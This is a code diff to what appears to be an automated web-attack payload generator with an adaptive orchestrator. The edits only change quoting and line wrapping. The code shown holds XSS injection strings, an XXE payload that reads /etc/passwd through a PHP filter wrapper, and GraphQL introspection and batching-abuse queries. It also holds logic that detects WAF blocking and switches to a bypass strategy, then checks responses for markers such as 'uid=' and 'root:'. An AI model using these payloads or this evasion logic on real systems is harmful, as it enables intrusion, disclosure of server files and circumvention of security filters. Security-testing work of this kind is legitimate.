@@ -147,12 +147,12 @@ class CFGGrammarEngine:
             f"'><img src=x onerror={body}>",
             f"javascript:{body}",
             f"<body onpageshow={body}>",
-            f"<iframe srcdoc=\"<script>{body}</script>\">",
+            f'<iframe srcdoc="<script>{body}</script>">',
         ]
         dom = [
             f"#<img src=x onerror={body}>",
             f"';{body}//",
-            f"\";{body}//",
+            f'";{body}//',
         ]
         if subtype == "dom":
             return dom
@@ -197,7 +197,7 @@ class CFGGrammarEngine:
         )
         php_wrapper = (
             '<?xml version="1.0"?>\n'
-            '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM '
+            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "
             '"php://filter/convert.base64-encode/resource=/etc/passwd"> ]>\n'
             "<foo>&xxe;</foo>"
         )
@@ -283,10 +283,10 @@ class CFGGrammarEngine:
         return [
             "query { __schema { types { name fields { name } } } }",
             "query { __schema { queryType { name } mutationType { name } } }",
-            "query { __type(name: \"User\") { name fields { name type { name } } } }",
+            'query { __type(name: "User") { name fields { name type { name } } } }',
             "{ __schema { directives { name args { name } } } }",
             # batching abuse (array of operations in one request)
-            "[{ \"query\": \"query{__typename}\" }, { \"query\": \"query{__typename}\" }]",
+            '[{ "query": "query{__typename}" }, { "query": "query{__typename}" }]',
             # deeply nested field stuffing (DoS-adjacent; benign depth marker)
             "query { a: __typename b: __typename c: __typename }",
         ]
@@ -411,7 +411,9 @@ class ClosedLoopAdaptiveOrchestrator:
         b_lower = body.lower()
         if status_code in (403, 406, 429) or "waf" in b_lower or "blocked" in b_lower:
             filter_type = "keyword_block" if "keyword" in b_lower else "status_block"
-            return AdaptiveDecision(action="switch_bypass_strategy", detected_filter=filter_type, success=False)
+            return AdaptiveDecision(
+                action="switch_bypass_strategy", detected_filter=filter_type, success=False
+            )
 
         markers = ["results:", "1, 2", "uid=", "root:"]
         if any(m in b_lower for m in markers):
